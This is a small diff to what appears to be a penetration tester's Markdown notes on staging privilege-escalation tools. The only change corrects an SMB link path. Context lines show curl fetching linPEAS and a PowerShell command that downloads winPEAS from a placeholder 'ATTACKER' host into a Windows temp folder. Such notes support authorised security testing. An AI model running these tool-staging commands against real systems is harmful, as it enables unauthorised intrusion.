@@ -35,7 +35,7 @@ curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.s
 iwr -Uri http://ATTACKER/winPEASx64.exe -OutFile C:\Windows\Temp\wp.exe
 ```
 
-Other channels (SMB, nc, certutil) in [netcat](../Shell/netcat.md) and [smb](../Tools/smb.md). Save output into your engagement `scans/`.
+Other channels (SMB, nc, certutil) in [netcat](../Shell/netcat.md) and [smb](../Protocols/smb.md). Save output into your engagement `scans/`.
 
 ## linPEAS
 
